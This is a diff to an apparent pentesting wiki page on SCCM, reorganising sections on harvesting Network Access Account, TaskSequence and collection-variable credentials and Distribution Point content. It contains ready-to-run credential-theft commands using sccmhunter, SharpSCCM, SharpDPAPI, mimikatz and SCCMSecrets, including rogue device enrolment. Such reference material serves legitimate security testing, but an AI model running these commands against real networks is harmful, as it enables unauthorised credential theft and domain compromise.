@@ -19,21 +19,24 @@ Curently there are three different pathways for privilege escalation routes in a
 
 The following SCCM components can contain credentials:
 
-* Device Collection variables
-* TaskSequence variables
-* Network Access Accounts (NAAs)
+* Device Collection variables: Devices enrolled in an SCCM environment can be grouped by collection. These exist by default, but administrators can create custom collections (for example "Server 2012 devices"), and add variables for these collections that will be used, for example, during application deployement to check some conditions. These variables may very well contain credentials and be found locally on the clients.
+* TaskSequence variables: TaskSequence are steps that can be configured by an administrator to perform specific actions, for example "Sequence for adding a machine to the domain". Think of it as a script that runs. These TaskSequences can contain variables that can contain credentials. These sequences can use device collection variables (presented in the next section) as conditions.
+* Network Access Accounts (NAAs): NAAs are manually created domain accounts used to retrieve data from the SCCM Distribution Point (DP) if the machine cannot use its machine account. Typically, when a machine has not yet been registered in the domain. To do this, the SCCM server sends the NAA policy to the machine, which will store the credentials encrypted by DPAPI on the disk. The credentials can be retrieved by requesting the WMI class in the CIM store in a binary file on the disk.
 * Client Push Accounts
 * Application & Scripts (potentially)
 
-Find more details about these components in [this blog](https://www.securesystems.de/blog/active-directory-spotlight-attacking-the-microsoft-configuration-manager/) post.
+> [!NOTE]
+> ```
+>NAA doesn't need to be privileged on the domain, but it can happen that administrators give too many privileges to these accounts. 
+>It is worth to note that, even after deleting or changing the NAA in the SCCM configuration, the binary file still contains the encrypted credentials on the enrolled computers.
+> ```
 
-#### Network Access Accounts (NAAs)
+Find more details about these components in [this blog](https://www.securesystems.de/blog/active-directory-spotlight-attacking-the-microsoft-configuration-manager/) post or [this one](https://www.synacktiv.com/publications/sccmsecretspy-exploiting-sccm-policies-distribution-for-credentials-harvesting-initial).
 
-NAAs are manually created domain accounts used to retrieve data from the SCCM Distribution Point (DP) if the machine cannot use its machine account. Typically, when a machine has not yet been registered in the domain. To do this, the SCCM server sends the NAA policy to the machine, which will store the credentials encrypted by DPAPI on the disk. The credentials can be retrieved by requesting the WMI class in the CIM store in a binary file on the disk.
 
-NAA doesn't need to be privileged on the domain, but it can happen that administrators give too many privileges to these accounts.
+#### Local credentials harvesting
 
-It is worth to note that, even after deleting or changing the NAA in the SCCM configuration, the binary file still contains the encrypted credentials on the enrolled computers.
+Multiple secrets and credentials can be extracted on a machine enrolled in SCCM. For example, it is possible to retrieve the Network Access Accounts (NAA) in the NAA policy which it's sent by the SCCM server and stored on the SCCM client disk encrypted with DPAPI, and the TaskSequence and Device Collection variables, also encrypted by DPAPI.
 
 ::: tabs
 
@@ -45,7 +48,80 @@ From UNIX-like systems, with administrative privileges over a device enrolled in
 SystemDPAPIdump.py -creds -sccm $DOMAIN/$USER:$PASSWORD@target.$DOMAIN
 ```
 
+Alternatively, [sccmhunter](https://github.com/garrettfoster13/sccmhunter) (Python) also permits to decipher the DPAPI and extract the Network Access Accounts, the Device Collection variables and the TaskSequence variables.
+
+```bash
+python3 sccmhunter.py dpapi -u $USER -p $PASSWORD -d $DOMAIN -dc-ip $DC_IP -target $TARGET_IP -both
+```
+
+=== From Windows
+
+From a Windows machine enrolled in the SCCM environment, [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) (C#), [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI), [Mimikatz](https://github.com/gentilkiwi/mimikatz) (C) or a PowerShell command, can be used with, administrative rights, to extract the NAA credentials locally.
+
+```powershell
+# Locally From WMI
+Get-WmiObject -Namespace ROOT\ccm\policy\Machine\ActualConfig -Class CCM_NetworkAccessAccount
+
+# Extracting from CIM store
+SharpSCCM.exe local secretes disk
+
+# Extracting from WMI
+SharpSCCM.exe local secretes wmi
+
+# Using SharpDPAPI
+SharpDPAPI.exe SCCM
+
+# Using mimikatz
+mimikatz.exe
+mimikatz # privilege::debug
+mimikatz # token::elevate
+mimikatz # dpapi::sccm
+```
+
+From a Windows machine enrolled in the SCCM environment, [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) (C#) or a PowerShell command can be used with, administrative rights, to extract the TaskSequence variables locally.
+
+```powershell
+# Locally from WMI 
+
+Get-WmiObject -Namespace ROOT\ccm\policy\Machine\ActualConfig -Class CCM_TaskSequence
+
+# Extracting from CIM store
+SharpSCCM.exe local secrets -m disk
+
+# Extracting from WMI
+SharpSCCM.exe local secrets -m wmi
+```
+
+From a Windows machine enrolled in the SCCM environment, [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) (C#) or a PowerShell command can be used with, administrative rights, to extract the collection variables locally.
+
+```powershell
+# Locally from WMI 
+
+Get-WmiObject -Namespace ROOT\ccm\policy\Machine\ActualConfig -Class CCM_CollectionVariable
+
+# Locally from CIM store
+SharpSCCM.exe local secrets -m disk
+
+# Locally from WMI
+SharpSCCM.exe local secrets -m wmi
+```
+
+:::
+
+#### Secret policies credentials extraction
+
+To quickly summarize, SCCM permits to new computers to self-enroll without authentication in the SCCM environment via the Management Point by quering the endpoint `http://<MP>/ccm_system/request`, and, by default, the enrolment must be approved by an administrator.
+
+However, still by default, it is possible to approve an enrolment with a domain machine account through the endpoint `http://<MP>/ccm_system_windowsauth/request`. This newly approved device can request the SCCM secret policies linked the collections where it has been added (by default, **All systems** or **All Desktop and Server clients**). These policies include the NAA credentials, the Task Sequence variables, and the Collection variables. They also indicate resources to download from the Distribution Point.
+
 On the other hand, it is possible, from a controlled computer account, to manually request the SCCM policy and retrieve the NAAs inside.
+
+> [!TIP] TIP
+> Sysadmins have the possibility to allow self-enrolment with automatic device approval. In this configuration, no machine credentials are needed since the new device will be automatically approved and able to obtain secret policies.
+
+::: tabs
+
+=== UNIX-based
 
 > [!CAUTION]
 > The tool author ([Adam Chester](https://twitter.com/_xpn_)) warns not to use this script in production environments.
@@ -96,107 +172,55 @@ python3 sccmhunter.py http -u $USER -p $PASSWORD -d $DOMAIN -dc-ip $DC_IP -auto
 python3 sccmhunter.py http -u $USER -p $PASSWORD -d $DOMAIN -cn $COMPUTER_NAME -cp $COMPUTER_PASSWORD -dc-ip $DC_IP
 ```
 
+Finally, [SCCMSecrets](https://github.com/synacktiv/SCCMSecrets) (Python) permits to enroll a new device, with or without automatic approval, and retrieve the secret policies.
+
+```bash
+#With auto approval enabled
+python3 SCCMSecrets.py policies -mp http://$MP_FQDN -cn 'evil'
+
+#Without auto approval, by specifying a valid computer account
+python3 SCCMSecrets.py policies -mp http://$MP_FQDN -u $COMPUTER_NAME -p $COMPUTER_PASSWORD -cn 'evil'
+```
 
 === From Windows
 
-From a Windows machine enrolled in the SCCM environment, [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) (C#), [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI), [Mimikatz](https://github.com/gentilkiwi/mimikatz) (C) or a PowerShell command, can be used with, administrative rights, to extract the NAA credentials locally.
-
-```powershell
-# Locally From WMI
-Get-WmiObject -Namespace ROOT\ccm\policy\Machine\ActualConfig -Class CCM_NetworkAccessAccount
-
-# Extracting from CIM store
-SharpSCCM.exe local secretes disk
-
-# Extracting from WMI
-SharpSCCM.exe local secretes wmi
-
-# Using SharpDPAPI
-SharpDPAPI.exe SCCM
-
-# Using mimikatz
-mimikatz.exe
-mimikatz # privilege::debug
-mimikatz # token::elevate
-mimikatz # dpapi::sccm
-```
-
-SharpSCCM also permits to request the SCCM policy remotely to retrieve the NAA credentials inside.
+From a Windows machine enrolled in the SCCM environment, [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) (C#) can be used to request the SCCM policy remotely to retrieve the NAA credentials inside.
 
 ```powershell
 SharpSCCM.exe get secretes
 ```
 
-:::
-
-
-#### TaskSequence variables
-
-TaskSequence are steps that can be configured by an administrator to perform specific actions, for example "Sequence for adding a machine to the domain". Think of it as a script that runs. These TaskSequences can contain variables that can contain credentials. These sequences can use device collection variables (presented in the next section) as conditions.
-
-::: tabs
-
-=== UNIX-based
-
-_At the time of writing (February 2024), no solution exists to perform this attack from a UNIX-like machine._
-
-=== From Windows
-
-From a Windows machine enrolled in the SCCM environment, [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) (C#) or a PowerShell command can be used with, administrative rights, to extract the TaskSequence variables locally.
-
-```powershell
-# Locally from WMI 
-
-Get-WmiObject -Namespace ROOT\ccm\policy\Machine\ActualConfig -Class CCM_TaskSequence
-
-# Extracting from CIM store
-SharpSCCM.exe local secrets -m disk
-
-# Extracting from WMI
-SharpSCCM.exe local secrets -m wmi
-```
-
-SharpSCCM also permits to request the SCCM policy remotely to retrieve the NAA credentials inside.
-
-```powershell
-SharpSCCM.exe get secrets
-```
-
-:::
-
-
-#### Device Collection variables
-
-Devices enrolled in an SCCM environment can be grouped by collection. These exist by default, but administrators can create custom collections (for example "Server 2012 devices"), and add variables for these collections that will be used, for example, during application deployement to check some conditions. These variables may very well contain credentials and be found locally on the clients.
-
-::: tabs
-
-=== UNIX-based
-
-_At the time of writing (February 2024), no solution exists to perform this attack from a UNIX-like machine._
-
-
-=== From Windows
-
-From a Windows machine enrolled in the SCCM environment, [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) (C#) or a PowerShell command can be used with, administrative rights, to extract the collection variables locally.
-
-```powershell
-# Locally from WMI 
-
-Get-WmiObject -Namespace ROOT\ccm\policy\Machine\ActualConfig -Class CCM_CollectionVariable
-
-# Locally from CIM store
-SharpSCCM.exe local secrets -m disk
-
-# Locally from WMI
-SharpSCCM.exe local secrets -m wmi
-```
-
-:::
-
-
 ![](<./assets/SharpSCCM-get-secrets-command.png>)
 
+:::
+
+#### Content library secrets extraction
+
+This service hosts the ressources to provide to the SCCM clients (scripts, applications, OS, etc). Everything is hosted in a share named `C:\SCCMContentLib` on the Distribution Point server, and can be retrieved either via SMB in an authenticated way, or via HTTP with a specific URL, also with authentication.
+
+**However, it appears that sysadmins can configure the HTTP way to allow unauthenticated access. In this case, anonyone can download all the packages and search for sensitive data inside.**
+
+::: tabs
+
+=== UNIX-based
+
+From a UNIX-like machine, [SCCMSecrets](https://github.com/synacktiv/SCCMSecrets) (Python) can be used to extract and rebuild all the packages from the Distribution Point. With the obtained packages, it is possible to manually search inside for secrets.
+
+The attack can be performed without credentials if unauthenticated access has been configured.
+
+```bash
+#Without credentials
+python3 SCCMSecrets files -dp http://$DP_FQDN
+
+#With valid credentials
+python3 SCCMSecrets.py files -dp http://$DP_FQDN -u $USER -p $PASSWORD
+```
+
+=== From Windows
+
+_At the time of writing, no solution exists to perform this attack automatically from a Windows machine._
+
+:::
 
 ### Authentication Coercion via Client Push Installation
 
@@ -575,3 +599,5 @@ Post exploitation via SCCM can now be performed on the network.
 [https://posts.specterops.io/site-takeover-via-sccms-adminservice-api-d932e22b2bf](https://posts.specterops.io/site-takeover-via-sccms-adminservice-api-d932e22b2bf)
 
 [https://posts.specterops.io/sccm-hierarchy-takeover-with-high-availability-7dcbd3696b43](https://posts.specterops.io/sccm-hierarchy-takeover-with-high-availability-7dcbd3696b43)
+
+[https://www.synacktiv.com/publications/sccmsecretspy-exploiting-sccm-policies-distribution-for-credentials-harvesting-initial](https://www.synacktiv.com/publications/sccmsecretspy-exploiting-sccm-policies-distribution-for-credentials-harvesting-initial)
